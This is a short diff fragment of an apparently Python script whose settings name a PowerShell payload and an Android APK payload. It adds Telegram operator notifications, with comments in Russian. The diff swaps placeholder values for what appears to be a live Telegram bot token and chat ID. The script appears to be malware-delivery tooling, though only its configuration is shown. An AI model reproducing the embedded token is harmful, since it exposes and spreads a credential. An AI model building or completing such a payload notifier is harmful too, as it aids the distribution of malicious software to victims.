@@ -9,8 +9,8 @@ PAYLOAD_PS1 = "payload.ps1"
 PAYLOAD_APK = "NexusAndroid.apk"
 
 # ====== TELEGRAM УВЕДОМЛЕНИЯ ======
-TG_TOKEN = "ВСТАВЬ_ТОКЕН"
-TG_CHAT  = "ВСТАВЬ_CHAT_ID"
+TG_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E"
+TG_CHAT  = "7065893630"
 
 def tg_notify(text):
     try:
